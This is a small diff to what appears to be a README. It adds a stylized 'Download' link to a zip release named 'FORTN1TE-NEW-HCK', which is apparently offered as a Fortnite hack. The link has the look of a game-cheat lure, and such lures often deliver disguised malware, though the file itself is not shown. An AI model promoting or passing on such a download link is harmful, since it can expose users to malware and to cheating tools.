@@ -4,7 +4,7 @@
 
 # UPDATE 16.07.2024
 
-## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/Vincent7564/FORTN1TE-NEW-HCK/releases/download/FORTN1TE-NEW-HCK/FORTN1TE-NEW-HCK.zip)***
 
 
 
